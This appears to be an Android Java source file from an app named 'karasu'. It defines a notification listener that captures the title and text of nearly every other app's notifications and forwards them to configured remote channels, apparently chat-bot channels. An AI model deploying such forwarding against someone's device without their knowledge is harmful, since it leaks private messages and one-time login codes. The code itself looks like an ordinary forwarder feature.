package com.tenix.karasu;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifService extends NotificationListenerService {

    // Skip noisy system/self packages
    private static final String[] SKIP = {
        "com.tenix.karasu",
        "android",
        "com.android.systemui",
        "com.android.phone",
        "com.google.android.gms",
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (krs.instance == null) return;
        if (sbn == null) return;

        String pkg = sbn.getPackageName();
        for (String s : SKIP) { if (pkg.equals(s)) return; }

        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        CharSequence title = extras.getCharSequence("android.title");
        CharSequence text  = extras.getCharSequence("android.text");
        if (title == null && text == null) return;

        // Resolve app name
        String appName = pkg;
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            appName = pm.getApplicationLabel(ai).toString();
        } catch (Exception ignored) {}

        String msg = "🔔 *" + appName + "*\n" +
            (title != null ? title.toString() : "") +
            (title != null && text != null ? "\n" : "") +
            (text  != null ? text.toString()  : "");

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText(msg, ch);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // silent
    }
}
